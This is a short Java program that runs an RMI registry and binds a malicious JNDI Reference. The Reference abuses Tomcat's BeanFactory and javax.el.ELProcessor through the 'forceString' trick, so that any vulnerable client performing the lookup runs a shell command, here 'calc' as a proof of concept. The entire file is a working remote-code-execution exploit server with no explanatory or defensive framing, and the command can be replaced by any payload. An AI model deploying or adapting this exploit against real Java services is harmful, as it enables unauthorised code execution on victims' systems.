import com.sun.jndi.rmi.registry.ReferenceWrapper;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import javax.naming.StringRefAddr;
import org.apache.naming.ResourceRef;

public class TomcatRMIServer {

    public static void main(String[] args) throws Exception {
        Registry registry = LocateRegistry.createRegistry(1098);
        ResourceRef resourceRef = new ResourceRef("javax.el.ELProcessor", (String)null, "", "", true, "org.apache.naming.factory.BeanFactory", (String)null);
        resourceRef.add(new StringRefAddr("forceString", "a=eval"));
        resourceRef.add(new StringRefAddr("a", "Runtime.getRuntime().exec(\"calc\")"));
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(resourceRef);
        registry.bind("EvalObj", referenceWrapper);
        System.out.println("the Server is bind rmi://127.0.0.1:1098/EvalObj");
    }
}